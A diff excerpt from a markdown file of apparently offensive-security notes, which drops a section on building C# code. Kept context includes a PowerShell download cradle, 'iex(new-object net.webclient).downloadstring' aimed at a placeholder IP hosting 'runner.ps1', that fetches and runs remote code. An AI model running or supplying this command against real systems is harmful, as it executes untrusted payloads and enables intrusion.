@@ -269,16 +269,6 @@ Host your powershell script
 ```
 iex(new-object net.webclient).downloadstring('http://IP:80/runner.ps1')
 ```
-
-
-
-#### Building *.cs code
-```
-csc sharp.cs output
-```
-or
-
-[Visual Studio](https://visualstudio.microsoft.com/)
 <br>
 <br>
 
